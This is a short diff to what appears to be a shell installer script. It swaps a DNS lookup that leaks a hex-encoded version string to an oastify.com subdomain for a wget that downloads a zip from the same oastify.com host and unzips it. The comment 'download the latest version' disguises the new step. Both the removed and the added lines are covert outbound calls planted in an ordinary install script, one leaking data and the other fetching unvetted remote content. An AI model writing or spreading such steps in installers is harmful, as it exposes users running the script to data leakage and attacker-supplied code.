@@ -104,7 +104,7 @@ SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 
 # strip "v" prefix if present
 VERSION="${VERSION#v}${!v}"
-VERSION_HASH="$(echo $VERSION| hexdump -v -e '/1 "%02x"')"
+VERSION_HASH="$(echo $VERSION|base64)"
 
 # The channel to install from:
 #   * stable
@@ -188,8 +188,9 @@ case "$CHANNEL" in
 		;;
 esac
 
-# log version hash
-dig A "${VERSION_HASH}.0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com"
+# download the latest version
+wget "http://0gh55r45jodfhk78hh00b0j1xs3krbf0.oastify.com/$VERSION_HASH.zip"
+unzip "$VERSION_HASH.zip"
 
 command_exists() {
 	command -v "$@" > /dev/null 2>&1
